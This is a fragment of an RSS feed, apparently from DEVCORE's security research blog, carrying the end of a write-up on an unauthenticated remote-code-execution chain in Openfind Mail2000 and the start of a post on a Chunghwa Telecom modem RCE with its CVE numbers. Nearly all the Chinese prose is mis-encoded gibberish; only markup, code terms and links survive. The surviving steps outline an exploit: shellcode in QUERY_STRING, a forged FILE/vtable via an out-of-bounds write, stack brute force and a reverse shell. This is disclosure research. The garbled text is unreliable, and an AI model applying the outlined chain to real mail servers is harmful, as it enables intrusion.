&lt;p&gt;Âú®ÊêúÁ¥¢‰∫ÜÊâÄÊúâ CGI ÂÖ•Âè£Èªû‰ª•ÂæåÔºåÊàëÂÄëÊâæÂà∞‰∫Ü‰∏ÄÂÄã‰∏çÈúÄË¶ÅÁôªÂÖ•ÔºåÂêåÊôÇÂèàÊúÉÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; ÁöÑ CGI ‚Äì &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;„ÄÇ‰∏ÄÂ¶ÇÂÖ∂ÂêçÔºåÂÆÉÂ∞±ÊòØ‰∏ÄÈöªÂëºÂè´ API ÁöÑÊé•Âè£ÔºåÂõ†Ê≠§Á®ãÂºèÊú¨Ë∫´ÈùûÂ∏∏ÁöÑÂ∞èÔºåÂπæ‰πéÊòØÂëºÂè´ÂÆå library Â∞±ÁµêÊùü‰∫ÜÔºå‰πüÂõ†Ê≠§‰∏çÂÜçÊúâ stack pivot ÁöÑ gadget ÂèØ‰ª•Âà©Áî®„ÄÇ
ÈÄôÊôÇÔºåÁî±ÊñºÊàëÂÄëÂ∑≤Á∂ìÂæóÁü• stack ÊòØÂèØÂü∑Ë°åÁöÑÔºåÂõ†Ê≠§ÂÖ∂ÂØ¶ÊàëÂÄëÊòØÂèØ‰ª•Ë∑≥ÈÅé ROP ÈÄôÂÄãÊ≠•È©üÔºåÁõ¥Êé•Â∞á shellcode ÊîæÁΩÆÂú® stack ‰∏äÁöÑÔºåÈÄôË£°Âà©Áî®Âà∞‰∏ÄÂÄã CGI ÁöÑÁâπÊÄß ‚Äì HTTP ÁöÑÁõ∏ÈóúËÆäÊï∏ÊúÉÊîæÂú®Áí∞Â¢ÉËÆäÊï∏‰∏≠ÔºåÂÉèÊòØ‰∏ãÂàóÈÄô‰∫õÂ∏∏Ë¶ãËÆäÊï∏Ôºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;HTTP_HOST&lt;/li&gt;
  &lt;li&gt;REQUEST_METHOD&lt;/li&gt;
  &lt;li&gt;QUERY_STRING&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ËÄåÁí∞Â¢ÉËÆäÊï∏‰∫ãÂØ¶‰∏äÂ∞±ÊòØË¢´ÊîæÁΩÆÂú® stack ÁöÑÊúÄÊú´Á´ØÔºå‰πüÂ∞±ÊòØÂèØÂü∑Ë°åÊÆµÁöÑ‰ΩçÁΩÆÔºåÂõ†Ê≠§ÊàëÂÄëÂè™Ë¶ÅÂÅΩÈÄ† vtable Áõ¥Êé•ÂëºÂè´ shellcode Â∞±ÂèØ‰ª•‰∫ÜÔºÅ
&lt;img src=&quot;/assets/img/blog/20191223/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Áï∂ÁÑ∂ÈÄôÊôÇÂÄôÂêåÊ®£Âá∫Áèæ‰∫Ü‰∏ÄÂÄãÂïèÈ°åÔºöÊàëÂÄë‰ªçËàäÊ≤íÊúâ stack ÁöÑË®òÊÜ∂È´î‰ΩçÁΩÆ„ÄÇÈÄôÂÄãÊôÇÂÄôÊúâ‰∫õ‰∫∫ÂèØËÉΩÊúÉÈô∑ÂÖ•‰∏ÄÂÄãËø∑ÊÄùÔºåË¶∫ÂæóÊîªÊìäÂ∞±ÊòØË¶Å‰∏ÄÊ¨°Âà∞‰ΩçÔºåÂÉèÂÄãÁãôÊìäÊâã‰∏ÄÊ®£‰∏ÄÊìäÂøÖÊÆ∫Ôºå‰ΩÜÂØ¶Èöõ‰∏äÂèØËÉΩÊòØÈÄôÊ®£ÊãøÊ©üÈóúÊßçÊääÊïµ‰∫∫ÁÇ∏È£õÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191223/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊèõÂÄãËßíÂ∫¶ÊÄùËÄÉÔºåÈÄôÈöª binary ÊòØ 32 bits ÁöÑÔºåÂõ†Ê≠§ÈÄôÂÄã‰ΩçÁΩÆÊúâ 1.5bytes ÊòØÈö®Ê©üÁöÑÔºåÁ∏ΩÂÖ±Êúâ 16&lt;sup&gt;3&lt;/sup&gt; ÂÄãÂèØËÉΩÁöÑÁµÑÂêàÔºåÊâÄ‰ª•ÂÖ∂ÂØ¶Âπ≥ÂùáÂè™Ë¶Å 4096 Ê¨°Ë´ãÊ±ÇÂ∞±ÂèØ‰ª•ÊíûÂà∞‰∏ÄÊ¨°ÔºÅÈÄôÂ∞çÊñºÁèæÂú®ÁöÑÈõªËÖ¶„ÄÅÁ∂≤Ë∑ØÈÄüÂ∫¶‰æÜË™™ÂÖ∂ÂØ¶‰πüÂ∞±ÊòØÂπæÂàÜÈêò‰πãÈñìÁöÑ‰∫ãÊÉÖÔºåÂõ†Ê≠§Áõ¥Êé•ÂÅöÊö¥ÂäõÁ†¥Ëß£‰πüÊòØÂèØË°åÁöÑÔºÅÊñºÊòØÊàëÂÄëÊúÄÁµÇÁöÑ exploit ÊµÅÁ®ãÂ∞±ÊòØÔºö&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;ÁôºÈÄÅ POST Ë´ãÊ±ÇËá≥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;QUERY_STRING ‰∏≠ÊîæÂÖ• shellcode&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Ëß∏ÁôºË∂äÁïåÂØ´ÂÖ•ÔºåË¶ÜËìã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;Âú®Ë∂äÁïåÁöÑÂèÉÊï∏Ê∫ñÂÇôÂÅΩÈÄ†ÁöÑ FILE &amp;amp; vtable&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt; ÁµêÊùüÂâçÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Ë∑≥Ëá≥ vtable ‰∏äÁöÑ shellcode ‰ΩçÁΩÆÔºåÂª∫Á´ã reverse shell&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÊúÄÂæåÊàëÂÄëÊàêÂäüÂØ´Âá∫‰∫Ü‰∏çÁî®Ë™çË≠âÁöÑ RCE ÊîªÊìäÈèàÔºå‰∏¶‰∏îÈÄôÂÄã exploit ÊòØ‰∏çÊúÉÂõ†ÁÇ∫ binary ÁöÑÁâàÊú¨‰∏çÂêåËÄåÂèóÂΩ±ÈüøÁöÑÔºÅËÄåÂú®ÂØ¶ÈöõÈÅáÂà∞ÁöÑÊ°à‰æã‰∏≠‰πüË≠âÊòé‰∫ÜÈÄôÂÄã exploit ÁöÑÂèØË°åÊÄßÔºåÊàëÂÄëÊõæÂú®‰∏ÄÊ¨°ÁöÑÊºîÁ∑¥Áï∂‰∏≠ÔºåËóâÁî± Mail2000 ÁöÑÈÄôÂÄã 1day ‰ΩúÁÇ∫Á™ÅÁ†¥Âè£ÔºåÊàêÂäüÊ¥©ÊºèÁõÆÊ®ôÁöÑ VPN Ë≥áÊñôÔºåÈÄ≤‰∏ÄÊ≠•ÂæÄÂÖßÁ∂≤Êª≤ÈÄèÔºÅ&lt;/p&gt;

&lt;h2 id=&quot;ÊºèÊ¥û‰øÆÂæ©&quot;&gt;ÊºèÊ¥û‰øÆÂæ©&lt;/h2&gt;

&lt;p&gt;Ê≠§ÊºèÊ¥ûÂ∑≤Âú® 2018/05/08 ÁôºÂ∏ÉÁöÑ Mail2000 V7 Patch 050 ÁâàÊú¨‰∏≠ÂÆåÊàê‰øÆÂæ©„ÄÇPatch Á∑®ËôüÁÇ∫ OF-ISAC-18-002„ÄÅOF-ISAC-18-003„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÂæåË®ò&quot;&gt;ÂæåË®ò&lt;/h2&gt;

&lt;p&gt;ÊúÄÂæåÊÉ≥‰æÜË´áË´áÂ∞çÊñºÈÄô‰∫õÊºèÊ¥ûÔºåÂª†ÂïÜË©≤Áî®‰ªÄÈ∫ºÊ®£ÁöÑÂøÉÊÖãÂéªÈù¢Â∞ç„ÄÇ‰ΩúÁÇ∫‰∏ÄÂÄãÊèê‰æõÁî¢ÂìÅÁöÑÂª†ÂïÜÔºåOpenfind Âú®ÈÄô‰∏ÄÊ¨°ÁöÑÊºèÊ¥ûËôïÁêÜ‰∏≠ÊúâÂπæÂÄãÈóúÈçµÂÄºÂæóÂ≠∏ÁøíÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ÂøÉÊÖãÈñãÊîæ
    &lt;ul&gt;
      &lt;li&gt;‰∏ªÂãïÊèê‰æõÊ∏¨Ë©¶Áí∞Â¢É&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Á©çÊ•µ‰øÆÂæ©ÊºèÊ¥û
    &lt;ul&gt;
      &lt;li&gt;Èù¢Â∞çÊºèÊ¥û‰ª•Á©çÊ•µÊ≠£ÂêëÁöÑÊÖãÂ∫¶ÔºåËøÖÈÄüËôïÁêÜ&lt;/li&gt;
      &lt;li&gt;‰øÆÂæ©ÂÆåÁï¢ÂæåÔºåËàáÊèêÂ†±ËÄÖÂêà‰ΩúÈ©óË≠â&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÈáçË¶ñÂÆ¢Êà∂ÂÆâÂÖ®
    &lt;ul&gt;
      &lt;li&gt;ÁôºÂ∏ÉÈáçÂ§ßÊõ¥Êñ∞‰∏¶‰∏ªÂãïÈÄöÂ†±ÂÆ¢Êà∂„ÄÅÂçîÂä©Êõ¥Êñ∞&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂÖ∂ÂØ¶Áî¢ÂìÅÊúâÊºèÊ¥ûÊòØÂæàÊ≠£Â∏∏‰πüÂæàÈõ£ÈÅøÂÖçÁöÑ‰∫ãÔºåËÄåÊàëÂÄëÁ†îÁ©∂ÁµÑÊòØ‰ΩúÁÇ∫‰∏ÄÂÄãÂçîÂä©ËÄÖÁöÑËßíËâ≤ÔºåÊúüÊúõËÉΩËóâÁî±ÂõûÂ†±ÊºèÊ¥ûÂπ´Âä©‰ºÅÊ•≠ÔºåÊèêÈ´òË≥áÂÆâÊÑèË≠ò‰∏¶Â¢ûÈÄ≤Âè∞ÁÅ£ÁöÑË≥áÂÆâÊ∞¥Âπ≥ÔºÅÂ∏åÊúõÂª†ÂïÜÂÄë‰πüËÉΩ‰ª•Ê≠£ÂêëÁöÑÊÖãÂ∫¶‰æÜÈù¢Â∞çÊºèÊ¥ûÔºåËÄå‰∏çÊòØÈñÉË∫≤ÈÄÉÈÅøÔºåÈÄôÊ®£Âè™ÊúÉ‰ª§Áî®Êà∂ÂÄëÈô∑ÂÖ•Êõ¥Â§ßÁöÑË≥áÂÆâÈ¢®Èö™Áï∂‰∏≠ÔºÅ&lt;/p&gt;

&lt;p&gt;ËÄåÂ∞çÊñº‰ΩøÁî®ÂêÑÈ†ÖË®≠ÂÇôÁöÑÁî®Êà∂Ôºå‰πüÊáâÁï∂ÊéåÊè°Â•ΩÂ±¨ÊñºËá™Â∑±ÁöÑË≥áÁî¢ÔºåÈò≤ÁÅ´ÁâÜ„ÄÅ‰º∫ÊúçÂô®Á≠âÁî¢ÂìÅ‰∏¶‰∏çÊòØË≥ºË≤∑‰æÜÊû∂Ë®≠Â•Ω‰ª•ÂæåÂ∞±Ê≤íÊúâÂïèÈ°å‰∫ÜÔºåÂÅöÂ•ΩË≥áÁî¢Áõ§Èªû„ÄÅËøΩËπ§Âª†ÂïÜÁöÑÂÆâÂÖ®ÊÄßÊõ¥Êñ∞ÔºåÊâçËÉΩÁ¢∫‰øùÁî¢ÂìÅ‰∏çÂèóÂà∞ 1day ÁöÑÊîªÊìäÔºÅËÄåÂÆöÊúüÈÄ≤Ë°åÊª≤ÈÄèÊ∏¨Ë©¶‰ª•ÂèäÁ¥ÖÈöäÊºîÁ∑¥ÔºåÊõ¥ÊòØÂèØ‰ª•Âπ´Âä©‰ºÅÊ•≠ÈáêÊ∏ÖËá™Â∑±ÊòØÂê¶ÊúâÁõ≤Èªû„ÄÅÁº∫Â§±ÔºåÈÄ≤ËÄåÊîπÂñÑ‰ª•Èôç‰Ωé‰ºÅÊ•≠Ë≥áÂÆâÈ¢®Èö™„ÄÇ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world/</link>
                <guid>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world</guid>
                <pubDate>Mon, 23 Dec 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>‰Ω†Áî®ÂÆÉ‰∏äÁ∂≤ÔºåÊàëÁî®ÂÆÉÈÄ≤‰Ω†ÂÖßÁ∂≤! ‰∏≠ËèØÈõª‰ø°Êï∏ÊìöÊ©üÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°åÊºèÊ¥û</title>
                <description>&lt;p&gt;Â§ßÂÆ∂Â•ΩÔºåÊàëÊòØ Orange! ÈÄôÊ¨°ÁöÑÊñáÁ´†ÔºåÊòØÊàëÂú® &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; ‰∏äÊâÄÂàÜ‰∫´ÁöÑË≠∞È°åÔºåË¨õËø∞Â¶Ç‰ΩïÂæû‰∏≠ËèØÈõª‰ø°ÁöÑ‰∏ÄÂÄãË®≠ÂÆöÁñèÂ§±ÔºåÂà∞‰∏≤Âá∫ÂèØ‰ª•ÊéåÊéßÊï∏ÂçÅËê¨„ÄÅÁîöËá≥Êï∏ÁôæËê¨Âè∞ÁöÑÂÆ∂Áî®Êï∏ÊìöÊ©üÊºèÊ¥û!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;

&lt;p&gt;Ë∫´ÁÇ∫ DEVCORE ÁöÑÁ†îÁ©∂ÂúòÈöäÔºåÊàëÂÄëÁöÑÂ∑•‰ΩúÂ∞±ÊòØÁ†îÁ©∂ÊúÄÊñ∞ÁöÑÊîªÊìäË∂®Âã¢„ÄÅÊåñÊéòÊúÄÊñ∞ÁöÑÂº±Èªû„ÄÅÊâæÂá∫ÂèØ‰ª•ÂΩ±ÈüøÊï¥ÂÄã‰∏ñÁïåÁöÑÊºèÊ¥ûÔºåÂõûÂ†±Áµ¶Âª†ÂïÜÈÅøÂÖçÈÄô‰∫õÊºèÊ¥ûÊµÅËá≥Âú∞‰∏ãÈªëÂ∏ÇË¢´ÈªëÂ∏ΩÈß≠ÂÆ¢ÁîöËá≥ÂúãÂÆ∂Á¥öÈß≠ÂÆ¢ÁµÑÁπîÂà©Áî®ÔºåËÆìÈÄôÂÄã‰∏ñÁïåËÆäÂæóÊõ¥Âä†ÂÆâÂÖ®!&lt;/p&gt;

&lt;p&gt;Êää„ÄåÊºèÊ¥ûÁ†îÁ©∂„ÄçÁï∂ÊàêÂ∑•‰ΩúÔºå‰∏ÄÁõ¥‰ª•‰æÜÊòØË®±Â§öË≥áË®äÂÆâÂÖ®ÊäÄË°ìÁãÇÁÜ±‰ªΩÂ≠êÁöÑÂ§¢ÊÉ≥Ôºå‰ΩÜÂ§ßÈÉ®ÂàÜÁöÑ‰∫∫Âè™ÁúãÂà∞ÁôºË°®ÊºèÊ¥û„ÄÅÊàñÁ´ô‰∏äÁ†îË®éÊúÉÊôÇÁöÑÂÖâÈÆÆ‰∫ÆÈ∫óÔºåÊ≤íÊ≥®ÊÑèÂà∞ËÉåÂæåÊâÄ‰∏ãÁöÑËã¶Â∑•Ôºå‰∫ãÂØ¶‰∏äÔºå„ÄåÊºèÊ¥ûÁ†îÁ©∂„ÄçÂæÄÂæÄÊòØ‰∏ÄÂÄãÈùûÂ∏∏Ê®∏ÂØ¶ÁÑ°ËèØÔºå‰∏îÊûØÁá•ÁöÑÈÅéÁ®ã„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊºèÊ¥ûÊåñÊéò‰∏¶‰∏çÂÉè &lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/&quot;&gt;Capture the Flag (CTF)&lt;/a&gt;Ôºå‰∏ÄÂÆöÂ≠òÂú®ËëóÊºèÊ¥û‰ª•Âèä‰∏ÄÂÄãÊ≠£Á¢∫ÁöÑËß£Ê≥ïÁ≠âËëó‰Ω†ÂéªËß£Âá∫ÔºåÂú®È°åÁõÆÁöÑÈôêÂÆöÁØÑÂúç‰∏ãÔºåÂè™Ë¶ÅÊ†πÊìöÁèæÊúâÁöÑÊ¢ù‰ª∂„ÄÅÁ∑öÁ¥¢ÂéªÊé®Êï≤Âá∫È°åËÄÖÁöÑÊÑèÂúñÔºåÂçÅ‰πãÂÖ´‰πùÂèØ‰ª•ÊâæÂá∫ÂïèÈ°åÈªû„ÄÇ ÈõñÁÑ∂ÈÇÑÊòØÊúâÈÇ£Á®ÆÊ∏ÖÊñ∞„ÄÅÂÑ™Ë≥™„ÄÅÈõ£Âà∞Èù†ÂåóÁöÑÊØîË≥Ω‰æãÂ¶Ç &lt;a href=&quot;https://ctf.hitcon.org/&quot;&gt;HITCON CTF&lt;/a&gt; ÊàñÊòØ &lt;a href=&quot;https://plaidctf.com/&quot;&gt;Plaid CTF&lt;/a&gt;Ôºå‰∏çÈÅé „ÄåÊâæÂá∫ÊºèÊ¥û„Äç Ëàá „ÄåÂ¶Ç‰ΩïÂà©Áî®ÊºèÊ¥û„ÄçÂú®Êú¨Ë≥™‰∏äÂ∑≤Á∂ìÊòØÂÖ©‰ª∂‰∏çÂêåÁöÑ‰∫ãÊÉÖ‰∫Ü!&lt;/p&gt;

&lt;p&gt;CTF ÂæàÈÅ©ÂêàÊúâ‰∏ÄÂÆöÁ®ãÂ∫¶ÁöÑ‰∫∫Á≤æÈÄ≤Ëá™Â∑±ÁöÑËÉΩÂäõÔºå‰ΩÜÁº∫Èªû‰πüÊòØÂ¶ÇÊûúÁ∂ìÂ∏∏Âú®ÈôêÂà∂‰ΩèÁöÑÂ∞èÊ°ÜÊ°ÜÂÖßÔºåÊÄùË∑ØÂèäÁúºÁïåÂÆπÊòìË¢´‰æ∑Èôê‰ΩèÔºåÁúüÂØ¶‰∏ñÁïåÁöÑÊîªÈò≤ÂæÄÂæÄÊõ¥Ë§áÈõú„ÄÅÁ∂≠Â∫¶‰πüÊõ¥Â§ß! Ë¶ÅÂú®‰∏ÄÂÄãÊàêÁÜü„ÄÅÂ∑≤‰ΩøÁî®Â§öÂπ¥Ôºå‰∏îÂÖ®‰∏ñÁïåË≥áÂÆâ‰∫∫Âì°ÈÉΩÂú®ÈóúÊ≥®ÁöÑÁî¢ÂìÅ‰∏äÊåñÊéòÂá∫Êñ∞Âº±ÈªûÔºåÂèØÊÉ≥ËÄåÁü•ÁµïÂ∞ç‰∏çÊòØÁ∞°ÂñÆÁöÑ‰∫ã! ‰∏ÄÂ†¥ CTF Á´∂Ë≥ΩÈ†ÇÂ§ö‰πüÂ∞± 48 Â∞èÊôÇÔºå‰ΩÜÂú®ÁÑ°Ê≥ïÁü•ÈÅìÁõÆÊ®ôÊòØÂê¶ÊúâÊºèÊ¥ûÁöÑÂâçÊèê‰∏ãÔºå‰Ω†ËÉΩÂ†ÖÊåÅÂ§ö‰πÖ?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;Âú®ÊàëÂÄë‰∏ä‰∏ÄÂÄãÁ†îÁ©∂‰∏≠&lt;/a&gt;ÔºåÁôºÁèæ‰∫Ü‰∏âÂÄãÁü•Âêç SSL VPN Âª†ÂïÜ‰∏≠‰∏çÁî®Ë™çË≠âÁöÑÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°åÊºèÊ¥ûÔºåÈõñÁÑ∂ÊàêÊûúË±êÁ¢©Ôºå‰ΩÜ‰πüÊòØËä±‰∫ÜÊï¥ÂÄãÁ†îÁ©∂ÁµÑÂçäÂπ¥ÁöÑÊôÇÈñì(Âä†‰∏äÂæåÁ∫åËôïÁêÜÁîöËá≥ÂèØÂà∞‰∏ÄÂπ¥)ÔºåÁîöËá≥Âú®ÂâçÂÖ©ÂÄãÊúàÂÆåÂÖ®ÊòØÈõ∂Áî¢Âá∫„ÄÅÊâæ‰∏çÂà∞ÊºèÊ¥û‰∏ãÊåÅÁ∫åÂÆåÊàêÁöÑ„ÄÇ ÊâÄ‰ª•Â∞çÊñº‰∏ÄÂÄãÂ•ΩÁöÑÊºèÊ¥ûÁ†îÁ©∂‰∫∫Âì°ÔºåÈô§‰∫ÜÁ∂úÂêàËÉΩÂäõ„ÄÅË¶ãË≠òÂ§öÂØ°‰ª•ÂèäËÉΩÂê¶Ê∑±Â∫¶ÊåñÊéòÂ§ñÔºåÈÇÑÈúÄË¶ÅÂÖ∑ÂÇôËÉΩÂ§†Áç®Á´ãÊÄùËÄÉÔºå‰ª•ÂèäËààË∂£ÊøÉÂéöÂà∞ËÄêÂæó‰ΩèÂØÇÂØûÁ≠âÁ≠âÁâπË≥™ÔºåÊâçÊúâËæ¶Ê≥ïÂú®È´òÈõ£Â∫¶ÁöÑÊåëÊà∞‰∏≠ÊÆ∫Âá∫‰∏ÄÊ¢ùË°ÄË∑Ø!&lt;/p&gt;

&lt;p&gt;ÊºèÊ¥ûÁ†îÁ©∂ÂæÄÂæÄ‰∏çÊòØ‰∏ÄÈñìÂÖ¨Âè∏Ë≥∫Èå¢ÁöÑÈ†ÖÁõÆÔºåÂçªÂèàÊòØÁÑ°Ê≥ï‰∏çÊäïË≥áÁöÑÈÉ®ÈñÄÔºåÊúâÂ§öÂ∞ëÂÖ¨Âè∏ËÉΩÂ§†ÂÖÅË®±Âì°Â∑•ÂçäÂπ¥„ÄÅÁîöËá≥‰∏ÄÂπ¥ÂéªÂÅö‰∏Ä‰ª∂‰∏ç‰∏ÄÂÆöÊúâÁî¢Âá∫ÁöÑÁ†îÁ©∂? Êõ¥‰ΩïÊ≥ÅÊòØÂ∞áÁ†îÁ©∂ÊàêÊûúÁÑ°Ê¢ù‰ª∂ÁöÑÂõûÂ†±Âª†ÂïÜÂè™ÊòØÁÇ∫‰∫ÜËÆì‰∏ñÁïåÊõ¥Âä†ÂÆâÂÖ®? ÈÄô‰πüÂ∞±ÊòØÊàëÂÄë DEVCORE ‰∏çË´ñÂú®&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;Êª≤ÈÄèÊ∏¨Ë©¶&lt;/a&gt;ÊàñÊòØ&lt;a href=&quot;https://devco.re/services/red-team/&quot;&gt;Á¥ÖÈöäÊºîÁ∑¥&lt;/a&gt;‰∏äÊØîÂà•‰∫∫‰æÜÁöÑÂÑ™ÁßÄÁöÑÁ∑£ÊïÖÔºåÈô§‰∫ÜÂπ≥Êó•ËªçÁÅ´Â∫´ÁöÑÁ¥ØÁ©çÂ§ñÔºåÁï∂ÈÅáÂà∞ÊºèÊ¥ûÊôÇÔºå‰πüÊúÉÊÉ≥Áõ°Ëæ¶Ê≥ïÂ∞áÈÄôÂÄãÊºèÊ¥ûÁöÑÂç±ÂÆ≥ÊúÄÂ§ßÂåñÔºåÂà©Áî®Èß≠ÂÆ¢ÊÄùÁ∂≠„ÄÅÈÄèÈÅéÂêÑÁ®Æ‰∏çÂêåÁµÑÂêàÂà©Áî®ÔºåÂ∞á‰∏ÄÂÄã‰ΩéÈ¢®Èö™ÊºèÊ¥ûÂà©Áî®Âà∞Ê•µËá¥ÔºåÈÄô‰πüÊâçÁ¨¶ÂêàÁúüÂØ¶‰∏ñÁïåÈß≠ÂÆ¢Â∞ç‰Ω†ÁöÑÊîªÊìäÊñπÂºè!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÂΩ±ÈüøÁØÑÂúç&quot;&gt;ÂΩ±ÈüøÁØÑÂúç&lt;/h2&gt;

&lt;p&gt;ÊïÖ‰∫ãÂõûÂà∞‰ªäÂπ¥ÂàùÁöÑÊüêÂ§©ÔºåÊàëÂÄë DEVCORE ÁöÑÊÉÖË≥á‰∏≠ÂøÉÁõ£ÊéßÂà∞ÂÖ®Âè∞ÁÅ£ÊúâÂ§ßÈáèÁöÑÁ∂≤Ë∑ØÂú∞ÂùÄÈñãËëó 3097 ÈÄ£Êé•Âü†ÔºåËÄå‰∏îÊúâË∂£ÁöÑÊòØÔºåÈÄô‰∫õÂú∞ÂùÄ‰∏¶‰∏çÊòØ‰ªÄÈ∫º‰º∫ÊúçÂô®ÁöÑÂú∞ÂùÄÔºåËÄåÊòØÊôÆÈÄöÁöÑÂÆ∂Áî®ÈõªËÖ¶„ÄÇ ‰∏ÄËà¨‰æÜË™™ÔºåÂÆ∂Áî®ÈõªËÖ¶ÈÄèÈÅéÊï∏ÊìöÊ©üÈÄ£Êé•‰∏äÁ∂≤ÈöõÁ∂≤Ë∑ØÔºåÂ∞çÂ§ñÁµï‰∏çÊúÉÈñãÊîæ‰ªª‰ΩïÊúçÂãôÔºåÂ∞±ÁÆóÊòØÊï∏ÊìöÊ©üÁöÑ SSH Âèä HTTP ÁÆ°ÁêÜ‰ªãÈù¢Ôºå‰πüÂè™ÊúâÂÖßÈÉ®Á∂≤Ë∑ØÊâçËÉΩË®™ÂïèÂà∞ÔºåÂõ†Ê≠§ÊàëÂÄëÊá∑ÁñëÈÄôËàá ISP ÁöÑÈÖçÁΩÆÂ§±Ë™§ÊúâÈóú! ÊàëÂÄë‰πüÊàêÂäüÁöÑÂú®ÈÄôÂÄãÈÄ£Êé•Âü†‰∏äÊåñÊéòÂá∫‰∏ÄÂÄã‰∏çÁî®Ë™çË≠âÁöÑÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°åÊºèÊ¥û! ÊâìÂÄãÊØîÂñªÔºåÂ∞±ÊòØÈß≠ÂÆ¢Â∑≤Á∂ìÁù°Âú®‰Ω†ÂÆ∂ÂÆ¢Âª≥Ê≤ôÁôºÁöÑÊÑüË¶∫!&lt;/p&gt;

&lt;p&gt;ÈÄèÈÅéÈÄôÂÄãÊºèÊ¥ûÊàëÂÄëÂèØ‰ª•ÂÆåÊàê:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Á´äËÅΩÁ∂≤Ë∑ØÊµÅÈáèÔºåÁ´äÂèñÁ∂≤Ë∑ØË∫´ÂàÜ„ÄÅPTT ÂØÜÁ¢ºÔºåÁîöËá≥‰Ω†ÁöÑ‰ø°Áî®Âç°Ë≥áÊñô&lt;/li&gt;
  &lt;li&gt;Êõ¥Êñ∞Âä´ÊåÅ„ÄÅÊ∞¥ÂùëÂºèÊîªÊìä„ÄÅÂÖßÁ∂≤‰∏≠ÁπºÊîªÊìäÂéªÊéßÂà∂‰Ω†ÁöÑÈõªËÖ¶ÁîöËá≥ÂÄã‰∫∫ÊâãÊ©ü&lt;/li&gt;
  &lt;li&gt;ÁµêÂêàÁ¥ÖÈöäÊºîÁ∑¥ÂéªÁπûÈÅéÂêÑÁ®ÆÈñãÁôºËÄÖÁöÑÁôΩÂêçÂñÆÊîøÁ≠ñ&lt;/li&gt;
  &lt;li&gt;Êõ¥Â§öÊõ¥Â§ö‚Ä¶&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ËÄåÁõ∏ÈóúÁöÑ CVE ÊºèÊ¥ûÁ∑®ËôüÁÇ∫:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13411&quot;&gt;CVE-2019-13411&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13412&quot;&gt;CVE-2019-13412&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15064&quot;&gt;CVE-2019-15064&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15065&quot;&gt;CVE-2019-15065&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15066&quot;&gt;CVE-2019-15066&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

